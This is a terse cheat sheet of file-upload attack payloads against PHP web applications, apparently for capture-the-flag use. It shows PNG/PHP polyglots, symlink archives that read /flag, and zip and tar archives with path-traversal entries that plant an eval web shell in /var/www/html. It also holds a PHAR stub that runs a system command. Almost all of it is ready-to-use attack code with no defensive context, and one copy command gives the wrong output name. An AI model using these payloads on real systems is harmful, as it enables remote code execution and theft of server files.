# rockyou.7z

```shell
...
```



# png.png

```shell
...
```



# php.php

```php
<?=`ls`;
```



# phtml.phtml

```pthml
<?=`ls`;
```



# payload.php.png

```shell
copy /b png.png + php.php payload.php.png
```





# payload.phtml.png

```shell
copy /b png.png + phtml.phtml payload.php.png
```



# flag.txt

```shell
ln -s /flag flag.txt
```



# flag.zip

```shell
ln -s /flag flag.txt
zip flag.zip flag.txt
```



# flag.tar

```shell
ln -s /flag flag.txt
tar -cf flag.tar flag.txt
```



# zip.zip

```python
import zipfile
with zipfile.ZipFile('zip.zip', 'w') as zf:
    zf.writestr('../../../../../../../../var/www/html/php.php', "<?php @eval($_GET['cmd']);?>")
```



# tar.tar

```python
import tarfile
import io

with tarfile.open('tar.tar', 'w') as tf:
    content = b"<?php @eval($_GET['cmd']);?>"
    
    tarinfo = tarfile.TarInfo(name='../../../../../../../../var/www/html/php.php')
    tarinfo.size = len(content)
    
    tf.addfile(tarinfo, fileobj=io.BytesIO(content))
```



# phar.phar.gz

```php
<?php
$phar = new Phar('phar.phar');
$phar->startBuffering();

$stub = <<<'STUB'
<?php
    system('ls /');
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

?>
```

```shell
D:\Environment\php\php-8.4.13\php.exe -d phar.readonly=0 D:\Work\test\php\1\main.php
```

```shell
gzip phar.phar
```